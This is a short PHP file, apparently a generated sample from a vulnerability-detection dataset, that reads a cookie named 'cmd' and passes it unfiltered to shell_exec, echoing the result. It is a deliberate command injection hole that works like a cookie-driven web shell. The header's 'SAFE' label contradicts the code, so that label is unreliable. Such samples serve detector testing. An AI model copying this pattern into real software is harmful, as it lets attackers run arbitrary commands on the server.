<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=COOKIE; CE_MODE=FILTER_INPUT_COOKIE; SKELETON=S3; KEY=cmd; SINK=B3; VAR=v0041 */
function SINK_B3($command){
    $output=shell_exec($command);
    echo $output;
}
$inp = (string)(filter_input(INPUT_COOKIE, "cmd") ?? "");
$inp = (string)$inp; // no value processing
$f = function($x){
    return SINK_B3($x);
};
$out = $f($inp);
echo (string)($out);
?>
